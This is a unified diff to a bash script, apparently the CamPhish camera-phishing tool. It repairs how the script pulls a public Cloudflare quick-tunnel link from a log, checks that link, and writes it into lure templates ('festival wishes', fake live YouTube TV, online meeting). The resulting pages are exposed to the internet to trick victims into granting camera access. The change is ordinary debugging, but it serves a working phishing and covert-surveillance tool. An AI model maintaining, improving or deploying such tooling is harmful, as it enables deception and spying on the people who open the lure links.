@@ -57,15 +57,15 @@ local link=""
 if [[ ! -f "$logfile" ]]; then
 return 1
 fi
-# api.trycloudflare.com is the backend API — NOT the shareable public link
-link=$(grep -oE 'https://[a-zA-Z0-9-]+\.trycloudflare\.com' "$logfile" | grep -viE 'https://api\.trycloudflare\.com' | head -n1)
+# Quick tunnel hostnames are random multi-part names, e.g. words-words-words.trycloudflare.com
+link=$(grep -oE 'https://[a-z0-9]+(-[a-z0-9]+)+\.trycloudflare\.com' "$logfile" | head -n1)
 if [[ -n "$link" ]]; then
-printf "%s" "$link"
+printf '%s' "$link"
 return 0
 fi
-link=$(grep -oE '[a-zA-Z0-9-]+\.trycloudflare\.com' "$logfile" | grep -viE '^api\.trycloudflare\.com$' | head -n1)
+link=$(grep -oE '[a-z0-9]+(-[a-z0-9]+)+\.trycloudflare\.com' "$logfile" | head -n1)
 if [[ -n "$link" ]]; then
-printf "https://%s" "$link"
+printf 'https://%s' "$link"
 return 0
 fi
 return 1
@@ -218,18 +218,23 @@ printf "%s" "$ip"
 
 payload_site() {
 link="$1"
-sed 's+forwarding_link+'$link'+g' template.php > index.php
+if [[ -z "$link" || "$link" != http* ]]; then
+printf "\e[1;31m[!] Invalid tunnel link — cannot generate pages.\e[0m\n"
+printf "\e[1;93m[\e[0m!\e[1;93m] Got: %s\e[0m\n" "$link"
+exit 1
+fi
+sed "s+forwarding_link+${link}+g" template.php > index.php
 if [[ $option_tem -eq 1 ]]; then
-sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
-sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
+sed "s+forwarding_link+${link}+g" festivalwishes.html > index3.html
+sed "s+fes_name+${fest_name}+g" index3.html > index2.html
 elif [[ $option_tem -eq 2 ]]; then
-sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
-sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
+sed "s+forwarding_link+${link}+g" LiveYTTV.html > index3.html
+sed "s+live_yt_tv+${yt_video_ID}+g" index3.html > index2.html
 elif [[ $option_tem -eq 3 ]]; then
-sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
+sed "s+forwarding_link+${link}+g" OnlineMeeting.html > index2.html
 elif [[ $option_tem -eq 4 ]]; then
-sed 's+forwarding_link+'$link'+g' UWS.html > index3.html
-sed 's+uws_site_url+'$uws_site_url'+g' index3.html > index2.html
+sed "s+forwarding_link+${link}+g" UWS.html > index3.html
+sed "s+uws_site_url+${uws_site_url}+g" index3.html > index2.html
 else
 printf "\e[1;93m [!] Invalid template option!\e[0m\n"
 exit 1
@@ -307,17 +312,17 @@ return 0
 start_cloudflared_tunnel() {
 local cf_bin link proto attempt
 cf_bin=$(cloudflared_bin)
-rm -f .cloudflared.log .cloudflared.out .cloudflared.pid
+rm -f .cloudflared.log .cloudflared.out .cloudflared.pid .tunnel.link
 mkdir -p .camphish-cloudflared
 
 for proto in auto http2 quic; do
 stop_cloudflared_only
 
 if [[ "$proto" == "auto" ]]; then
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\e[0m\n"
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\e[0m\n" >&2
 nohup env HOME="$(pwd)/.camphish-cloudflared" "$cf_bin" tunnel --no-autoupdate --url http://127.0.0.1:3333 --loglevel info > .cloudflared.out 2>&1 &
 else
-printf "\e[1;92m[\e[0m+\e[1;92m] Retrying cloudflared with --protocol %s...\e[0m\n" "$proto"
+printf "\e[1;92m[\e[0m+\e[1;92m] Retrying cloudflared with --protocol %s...\e[0m\n" "$proto" >&2
 nohup env HOME="$(pwd)/.camphish-cloudflared" "$cf_bin" tunnel --no-autoupdate --url http://127.0.0.1:3333 --protocol "$proto" --loglevel info > .cloudflared.out 2>&1 &
 fi
 
@@ -332,7 +337,7 @@ link=$(get_cloudflare_link ".cloudflared.out")
 if [[ -n "$link" ]]; then
 sleep 2
 if cloudflared_is_running; then
-printf "%s" "$link"
+printf '%s' "$link" > .tunnel.link
 return 0
 fi
 break
@@ -578,7 +583,11 @@ restore_cloudflared_config
 exit 1
 fi
 
-link=$(start_cloudflared_tunnel)
+if start_cloudflared_tunnel; then
+link=$(cat .tunnel.link)
+else
+link=""
+fi
 if [[ -z "$link" ]]; then
 printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m CloudFlare tunnel service might be down\e[0m\n"
